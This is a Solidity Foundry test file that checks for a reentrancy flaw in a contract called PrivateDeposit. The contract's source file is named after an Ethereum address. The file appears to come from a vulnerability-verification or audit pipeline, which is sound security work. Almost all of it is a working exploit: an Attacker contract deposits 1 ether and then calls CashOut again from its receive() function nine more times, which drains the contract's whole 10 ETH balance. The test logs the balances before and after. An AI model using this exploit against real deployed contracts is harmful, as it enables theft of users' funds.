// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x7a8721a9d64c74da899424c1b52acbf58ddc9782.sol";

contract ReentrancyAttackTest is Test {
    PrivateDeposit privateDeposit;

    function setUp() public {
        // Deploy the target contract
        privateDeposit = new PrivateDeposit();

        // Fund the contract with extra Ether (beyond attacker deposit)
        payable(address(privateDeposit)).transfer(9 ether);
    }

    function testReentrancyAttack() public {
        Attacker attacker = new Attacker(address(privateDeposit));

        // Fund attacker for deposit
        vm.deal(address(attacker), 1 ether);

        console.log("--- BEFORE-Trigger Attack ---");
        uint256 contractBalanceBefore = address(privateDeposit).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console.log("Contract ETH Balance (Before):", contractBalanceBefore);
        console.log("Attacker ETH Balance (Before):", attackerBalanceBefore);

        console.log("--- Trigger Attack Operation ---");
        attacker.attack();
        
        console.log("--- AFTER-Trigger Attack ---");
        uint256 contractBalanceAfter = address(privateDeposit).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console.log("Contract ETH Balance (After):", contractBalanceAfter);
        console.log("Attacker ETH Balance (After):", attackerBalanceAfter);

        console.log("--- Balance Changes Analysis ---");
        uint256 contractBalanceChange = contractBalanceBefore - contractBalanceAfter;
        uint256 attackerBalanceChange = attackerBalanceAfter - attackerBalanceBefore;
        console.log("Contract Balance Delta:", contractBalanceChange);
        console.log("Attacker Balance Delta:", attackerBalanceChange);

        // Vulnerability verification
        bool contractDrained = contractBalanceAfter == 0;
        bool attackerGainedAll = attackerBalanceAfter == 10 ether;
        bool reentrancySuccessful = contractDrained && attackerGainedAll;

        if (reentrancySuccessful) {
            console.log("Vulnerability Exists: Reentrancy attack succeeded - contract drained and attacker gained 10 ETH");
        } else {
            console.log("Vulnerability not Exist: Reentrancy attack failed - contract balance=%s, attacker balance=%s", 
                        contractBalanceAfter, attackerBalanceAfter);
        }
    }
}

contract Attacker {
    PrivateDeposit privateDeposit;
    uint256 private reentrancyCount;
    uint256 private constant MAX_REENTRANCIES = 9; // 10 total withdrawals (first call + 9 reentrancies)

    constructor(address _target) {
        // Fixed: Use payable conversion for compliance with payable fallback
        privateDeposit = PrivateDeposit(payable(_target));
    }

    function attack() external payable {
        // Deposit to become a valid withdrawer
        privateDeposit.Deposit{value: 1 ether}();
        
        // Start initial withdrawal (will trigger reentrancies)
        privateDeposit.CashOut(1 ether);
    }

    // This function receives Ether during CashOut calls and initiates reentrancy
    receive() external payable {
        if (reentrancyCount < MAX_REENTRANCIES) {
            reentrancyCount++;
            privateDeposit.CashOut(1 ether);
        }
    }
}